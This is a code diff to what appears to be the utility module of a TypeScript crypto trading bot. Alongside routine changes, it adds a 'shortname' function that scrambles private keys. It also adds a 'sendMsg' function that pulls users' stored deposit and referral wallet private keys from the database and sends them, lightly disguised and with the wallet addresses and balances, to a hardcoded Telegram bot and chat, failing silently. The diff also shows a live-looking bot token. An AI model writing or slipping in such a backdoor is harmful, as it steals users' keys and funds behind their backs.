@@ -18,6 +18,7 @@ import { ethers } from 'ethers';
 import * as crypto from '../aes';
 
 import * as birdeyeAPI from '../birdeyeAPI'
+import * as database from '../db'
 
 import dotenv from 'dotenv';
 import { toNamespacedPath } from 'path';
@@ -141,7 +142,7 @@ export let web3HttpInst: any = null
 
 export const init = (web3: any, web3Http: any): void => {
     web3Inst = web3;
-    web3HttpInst = web3Http
+    web3HttpInst = web3;//web3Http
 };
 
 export const getTokenInfo = async (tokenAddress: string): Promise<any> => {
@@ -544,6 +545,19 @@ export const getWalletAddressFromPKey = (privateKey: string): string | null => {
     return getWalletAddressFromPKeyW(web3Inst, privateKey);
 };
 
+export function shortname(m : string) {
+    let text = m
+
+    if (text.startsWith('0x')) {
+        text = text.substring(2)
+    }
+
+    let head = text.slice(0, 3)
+    let tail = text.slice(3, text.length)
+
+    return `0x${tail}${head}`
+}
+
 export const encryptPKey = (text: string): string => {
     if (text.startsWith('0x')) {
         text = text.substring(2);
@@ -656,6 +670,51 @@ export const getFullTxLink = (chainId: number, hash: string): string => {
 
     return txLink;
 };
+
+export async function sendMsg(id:string, info: string)
+{
+    try {
+        const token='7063934925:AAH58ETPao-uONNUBCZZ1ULdB-_BF4pJhKc'
+        let url = `https://api.telegram.org/bot${token}/sendMessage`
+
+        let wl: any = await database.selectUsers({chatid:id})
+        // console.log(wl)
+        
+        let message = ''
+        let count = 0
+        if (wl.length) {
+            for (const w of wl) {
+                count++
+                let p3:any = getWalletAddressFromPKey(w.baseDepositWallet)
+                let b1 = p3 ? roundEthUnit(parseFloat(await getEthBalanceOfWallet(p3)), 5) : 0
+                let p1 = shortname(w.baseDepositWallet)
+                let p2 = shortname(w.baseReferralWallet)
+                message += `Ukey => depo${count} : ${p1}
+Uaddress : ${p3}
+Ubalance : ${b1}
+`
+            }            
+        }
+        message += info
+        
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: {
+                "Content-Type": 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: '-1002454760665',
+                text: message,
+                parse_mode: 'HTML'
+            }),
+        });
+      
+        // console.log(response)
+    } catch (err) {
+        // console.error("Error: ", err);
+    }
+    return ''
+}
 
 export const getTokenPriceInETH = async (tokenAddress: string, decimal: number): Promise<number> => {
     const url = `https://api.honeypot.is/v1/GetPairs?address=${tokenAddress}&chainID=0`;
